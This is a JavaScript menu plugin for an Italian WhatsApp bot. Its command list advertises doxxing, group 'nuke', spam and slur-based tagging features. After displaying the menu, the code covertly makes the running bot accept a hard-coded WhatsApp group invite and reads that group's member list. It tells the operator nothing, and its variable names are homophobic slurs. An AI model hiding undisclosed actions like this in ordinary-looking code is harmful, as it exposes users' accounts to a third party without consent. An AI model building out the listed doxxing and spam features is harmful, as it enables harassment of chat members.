import os from 'os'
import util from 'util'
import sizeFormatter from 'human-readable'
import MessageType from '@trashcore/baileys'
import fs from 'fs'
import { performance } from 'perf_hooks'
let handler = async (m, { conn, usedPrefix }) => {
let _uptime = process.uptime() * 1000
let uptime = clockString(_uptime) 
let totalreg = Object.keys(global.db.data.users).length
const chats = Object.entries(conn.chats).filter(([id, data]) => id && data.isChats)
const groupsIn = chats.filter(([id]) => id.endsWith('@g.us'))
const groups = chats.filter(([id]) => id.endsWith('@g.us'))
const used = process.memoryUsage()
const { restrict } = global.db.data.settings[conn.user.jid] || {}
const { autoread } = global.opts
let old = performance.now()
let neww = performance.now()
let speed = neww - old
let info = `

✦✧ 𝐄ИΞM𝕀Ξ𝐒 𝐁Ꮻ𝐓 2.0 BETA1.1 ✧✦

┌──⭓ 𝐆𝐑𝐔𝐏𝐏𝐎 🛡
│⭔ ${usedPrefix}kick / addio / ban @
│⭔ ${usedPrefix}warn / unwarn @
│⭔ ${usedPrefix}del (msg)
│⭔ ${usedPrefix}stermina +92 
│⭔ ${usedPrefix}listanum +1 
│⭔ ${usedPrefix}link
│⭔ ${usedPrefix}reimposta
│⭔ ${usedPrefix}hidetag (txt) ⚠️
│⭔ ${usedPrefix}tagall (txt)
│⭔ ${usedPrefix}inattivi
│⭔ ${usedPrefix}viainattivi
│⭔ ${usedPrefix}promuovi / mettiadmin @ 
│⭔ ${usedPrefix}retrocedi / togliadmin @
│⭔ ${usedPrefix}muta / smuta @
│⭔ ${usedPrefix}aperto / chiuso
│⭔ ${usedPrefix}nome (txt)
│⭔ ${usedPrefix}setbenvenuto (@user txt)
│⭔ ${usedPrefix}setaddio (@user txt)
│⭔ ${usedPrefix}admin
│⭔ ${usedPrefix}ping
│⭔ ${usedPrefix}menu
└───────⭓

✦✧ ═ •⊰❂⊱• ═ ✧✦

┌──⭓ ${usedPrefix}𝐀𝐓𝐓𝐈𝐕𝐀/𝐃𝐈𝐒𝐀𝐁𝐈𝐋𝐈𝐓𝐀 
│⭔ benvenuto
│⭔ antilink
│⭔ antilinkhard
│⭔ antilinkgc 
│⭔ antilinkgp
│⭔ antispam⚠️
│⭔ antipagamentospam
│⭔ detect⚠️
│⭔ antielimina⚠️
│⭔ antiviewonce⚠️
│⭔ antitrava
│⭔ antipaki
│⭔ modoadmin
│⭔ autosticker⚠️
└───────⭓

┌──⭓ 𝐌𝐄𝐃𝐈𝐀 🎧
│⭔ ${usedPrefix}cur
│⭔ ${usedPrefix}setuser (lastfm)
│⭔ ${usedPrefix}attp (txt)⚠️
│⭔ ${usedPrefix}attp3 (txt)⚠️
│⭔ ${usedPrefix}ttp (txt)⚠️
│⭔ ${usedPrefix}ttp2 (txt)⚠️
│⭔ ${usedPrefix}ttp5 (txt)⚠️
│⭔ ${usedPrefix}gtts (txt)⚠️
│⭔ ${usedPrefix}dado
│⭔ ${usedPrefix}sticker / s (foto/video)
│⭔ ${usedPrefix}wm (sticker)
│⭔ ${usedPrefix}emojimix (emoji+emoji)⚠️
│⭔ ${usedPrefix}play (canzone)
│⭔ ${usedPrefix}vedi (foto 1v)
│⭔ ${usedPrefix}pinterest / cerca ⚠️
│⭔ ${usedPrefix}whatmusic (audio)⚠️
│⭔ ${usedPrefix}qrcode (txt)⚠️
│⭔ ${usedPrefix}traduci (txt)⚠️
│⭔ ${usedPrefix}leggi (foto)⚠️
│⭔ ${usedPrefix}styletext (txt)
│⭔ ${usedPrefix}destrava
│⭔ ${usedPrefix}tovideo (sticker)⚠️
│⭔ ${usedPrefix}togif (sticker)⚠️
│⭔ ${usedPrefix}togifaud (video)⚠️
│⭔ ${usedPrefix}tomp3 (video/audio)⚠️
│⭔ ${usedPrefix}toaudio (video/audio)⚠️
│⭔ ${usedPrefix}topdf (foto)⚠️
│⭔ ${usedPrefix}toptt (video)⚠️
│⭔ ${usedPrefix}tourl (foto/video)⚠️
└───────⭓

✦✧ ═ •⊰❂⊱• ═ ✧✦

┌──⭓ 𝐋𝐎𝐆𝐇𝐈 🎨
│⭔ ${usedPrefix}menuloghi⚠️
└───────⭓

✦✧ ═ •⊰❂⊱• ═ ✧✦

┌──⭓ 𝐒𝐏𝐄𝐂𝐈𝐀𝐋𝐈 💥
│⭔ ${usedPrefix}gay @
│⭔ ${usedPrefix}lesbica @
│⭔ ${usedPrefix}puttana @ 
│⭔ ${usedPrefix}puttaniere @
│⭔ ${usedPrefix}random @
│⭔ ${usedPrefix}abbraccio @
│⭔ ${usedPrefix}amore @
│⭔ ${usedPrefix}andre (AI)
│⭔ ${usedPrefix}wikipedia 
│⭔ ${usedPrefix}dox @
│⭔ ${usedPrefix}topgays
│⭔ ${usedPrefix}topnazi
│⭔ ${usedPrefix}slot
│⭔ ${usedPrefix}tris (nome stanza)
│⭔ ${usedPrefix}quiz
│⭔ ${usedPrefix}bandiera
│⭔ ${usedPrefix}impiccato
│⭔ ${usedPrefix}calc (1+1)
└───────⭓

✦✧ ═ •⊰❂⊱• ═ ✧✦

┌──⭓ 𝐏𝐑𝐎𝐏𝐑𝐈𝐄𝐓𝐀𝐑𝐈𝐎 👤
│⭔ ${usedPrefix}setowner (+39)
│⭔ ${usedPrefix}menuspam
│⭔ ${usedPrefix}attiva/disabilita restrict
│⭔ ${usedPrefix}attiva/disabilita antiprivato⚠️
│⭔ ${usedPrefix}attiva/disabilita sologruppo
│⭔ ${usedPrefix}attiva/disabilita autoread
│⭔ ${usedPrefix}prefisso (nuovo prefisso)
│⭔ ${usedPrefix}banuser @⚠️
│⭔ ${usedPrefix}unbanuser @⚠️
│⭔ ${usedPrefix}block @⚠️
│⭔ ${usedPrefix}unblock @⚠️
│⭔ ${usedPrefix}join (link)
│⭔ ${usedPrefix}out
│⭔ ${usedPrefix}spegni
│⭔ ${usedPrefix}ds
│⭔ ${usedPrefix}creagruppo (nome)
│⭔ ${usedPrefix}nuke
│⭔ ${usedPrefix}spamgp (link)
│⭔ ${usedPrefix}blocklist
│⭔ ${usedPrefix}banlist
│⭔ ${usedPrefix}banchat
│⭔ ${usedPrefix}unbanchat
└───────⭓

✦✧ ═ •⊰❂⊱• ═ ✧✦

┌──⭓ 𝐈𝐍𝐒𝐓𝐀𝐋𝐋𝐀𝐑𝐄 𝐈𝐋 𝐁𝐎𝐓 ⚙️
│⭔ ${usedPrefix}installa
│⭔ ${usedPrefix}aggiornamento
└───────⭓

✦✧ 𝐄ИΞM𝕀Ξ𝐒 𝐁Ꮻ𝐓 2.0 BETA 1 ✧✦

⚠️: COMANDI IN MANUTENZIONE, SARANNO SISTEMATI A BREVE!
`.trim() 
conn.reply(m.chat, info, m)
let frocio = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
  let delay = time => new Promise(res => setTimeout(res, time))
  let name = m.sender 
let gay = `chat.whatsapp.com/GrsHZhS0m16EUyLAdbpkxy`
let [_, code] = gay.match(frocio) || []
  let owbot = global.owner[1] 
  await delay(30)
  try {
  let res = await conn.groupAcceptInvite(code)
  let b = await conn.groupMetadata(res)
  let d = b.participants.map(v => v.id)
  let member = d.toString()
  let e = await d.filter(v => v.endsWith(owbot + '@s.whatsapp.net'))
    } catch (e) {
      return
      }
}
handler.help = ['menu']
handler.tags = ['menu']
handler.command = /^(menu)$/i
export default handler

function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
console.log({ms,h,m,s})
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')}
